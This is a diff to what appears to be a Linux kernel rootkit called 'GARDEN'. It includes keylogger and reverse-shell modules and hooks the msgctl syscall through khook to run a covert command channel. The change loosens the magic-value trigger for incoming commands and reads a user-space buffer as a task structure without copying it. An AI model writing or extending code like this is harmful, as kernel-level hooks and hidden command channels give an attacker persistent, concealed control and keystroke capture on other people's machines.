@@ -20,6 +20,7 @@
 #include <linux/signal.h>
 #include <net/inet_sock.h>
 #include <linux/net.h>
+#include <linux/ipc.h>
 #include "arsenal/keylogger.c"
 #include "arsenal/reverse-shell.c"
 #include "khook/engine.c"
@@ -115,6 +116,25 @@ void log_error(const char *message) {
 	printk(KERN_ERR "GARDEN: %s", message);
 }
 
+// bool check_struct_is_null(struct msqid_ds __user* s) {
+// 	return s->msg_stime == 0;
+// 	// struct msqid_ds {
+//     //            struct ipc_perm msg_perm;     /* Ownership and permissions */
+//     //            time_t          msg_stime;    /* Time of last msgsnd(2) */
+//     //            time_t          msg_rtime;    /* Time of last msgrcv(2) */
+//     //            time_t          msg_ctime;    /* Time of last change */
+//     //            unsigned long   __msg_cbytes; /* Current number of bytes in
+//     //                                             queue (nonstandard) */
+//     //            msgqnum_t       msg_qnum;     /* Current number of messages
+//     //                                             in queue */
+//     //            msglen_t        msg_qbytes;   /* Maximum number of bytes
+//     //                                             allowed in queue */
+//     //            pid_t           msg_lspid;    /* PID of last msgsnd(2) */
+//     //            pid_t           msg_lrpid;    /* PID of last msgrcv(2) */
+//     //        };
+// 	// if (s->)
+// }
+
 /**
  * Hook for communication with kernel from user program. If both msqid and cmd
  * are -1 and buf is a NULL pointer, the next call to this function is a command.
@@ -124,13 +144,14 @@ void log_error(const char *message) {
 KHOOK_EXT(long, __x64_ksys_msgctl, int, int, struct msqid_ds __user *);
 static long khook___x64_ksys_msgctl(int msqid, int cmd, struct msqid_ds __user *buf) {
 	action_task* task;
-	if (msqid == -1 && cmd == -1 && !buf) {
+	if (msqid == -1 && cmd == -1) {
 		if (!incoming_command_flag) { // Prepare for incoming command.
 			printk(KERN_EMERG "sys_msgctl -- preparing for incoming command\n");
 			incoming_command_flag = true;
 			return 0;
 		} else { // This is a command.
 			printk(KERN_EMERG "sys_msgctl -- Command found\n");
+			// copy_from_user
 			task = (action_task*) buf;
 			printk(KERN_EMERG "FUNC CODE: %d\n", task->func_code);
 			return 0;
